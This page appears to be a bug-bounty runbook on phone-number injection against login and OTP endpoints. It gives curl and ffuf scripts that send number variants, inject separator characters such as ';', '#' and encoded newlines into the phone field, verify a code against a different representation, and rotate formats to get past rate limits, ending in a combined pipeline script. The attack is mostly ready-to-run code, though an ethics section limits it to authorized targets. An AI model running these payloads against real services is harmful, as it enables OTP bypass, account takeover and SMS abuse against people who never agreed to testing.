---
title: "Phone Number Injections"
description: "How messy phone-number parsing opens OTP bypasses, SMS gateway abuse, and account takeover through format confusion."
phase: Web
order: 61
tags:
  - otp
  - sms
  - authentication
  - input-validation
tools:
  - curl
  - ffuf
updated: 2026-10-01
---

A phone-number abuse runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: find where registration, login, and OTP lookup normalize a number differently, then prove account collision or OTP bypass using only your own numbers.

## 1. Map the request flow

```bash
curl -s -X POST "https://target.com/api/auth/start" \
  -H "Content-Type: application/json" \
  -d '{"phone":"+15551234567"}' -o start.json

curl -s -X POST "https://target.com/api/auth/verify" \
  -H "Content-Type: application/json" \
  -d '{"phone":"+15551234567","code":"123456"}'
```

Note which value is echoed, stored, or used in the OTP lookup.

## 2. Enumerate format variants

```bash
cat <<'EOF' > phones.txt
+15551234567
15551234567
0015551234567
+1 555 123 4567
(555) 123-4567
EOF

while read -r p; do
  printf '%s -> ' "$p"
  curl -s -o /dev/null -w '%{http_code}\n' -X POST \
    "https://target.com/api/auth/start" \
    -H "Content-Type: application/json" -d "{\"phone\":\"$p\"}"
done < phones.txt
```

Look for variants that reuse an account, create a duplicate, or return the same challenge.

## 3. Separator and extension injection

```bash
for p in '+15551234567;123' '+15551234567#4444' '+15551234567,999' \
         '+15551234567%0a' '+15551234567--x'; do
  curl -s -X POST "https://target.com/api/auth/start" \
    -H "Content-Type: application/json" -d "{\"phone\":\"$p\"}"
done
```

If `#`/`;`/newline survives in logs but is truncated before the OTP lookup, you can bind a code to a victim value.

## 4. OTP binding and reuse

```bash
# Request with your formatting, verify with another representation
curl -s -X POST "https://target.com/api/auth/verify" \
  -d '{"phone":"0015551234567","code":"<your-code>"}'
```

Also test: request a code for variant A, verify against variant B.

## 5. Rate-limit rotation

```bash
printf '+15551234567\n0015551234567\n15551234567\n+1 555 123 4567\n' \
  | ffuf -u "https://target.com/api/auth/start" -X POST \
    -H "Content-Type: application/json" \
    -d '{"phone":"FUZZ"}' -w - -mc all -fs 0
```

Only send SMS to numbers you own; stop as soon as the bypass is proven.

## Full pipeline

```bash
TARGET="https://target.com/api/auth"
cat <<'EOF' > phones.txt
+15551234567
15551234567
0015551234567
+1 555 123 4567
EOF
while read -r p; do
  printf '%s -> ' "$p"
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "$TARGET/start" \
    -H "Content-Type: application/json" -d "{\"phone\":\"$p\"}"
done < phones.txt
for p in '+15551234567;123' '+15551234567#4444' '+15551234567,999'; do
  curl -s -X POST "$TARGET/start" \
    -H "Content-Type: application/json" -d "{\"phone\":\"$p\"}"
done
curl -s -X POST "$TARGET/verify" \
  -H "Content-Type: application/json" \
  -d '{"phone":"0015551234567","code":"<your-code>"}'
```

## Ethics & legality

- Only send SMS/OTP to phone numbers you own or are explicitly authorized to test.
- Never use format confusion to trigger messages to a victim (SMS bombing / toll fraud).
- Respect per-number rate limits; stop immediately once the flaw is confirmed.
- Redact real numbers and codes from the final report.
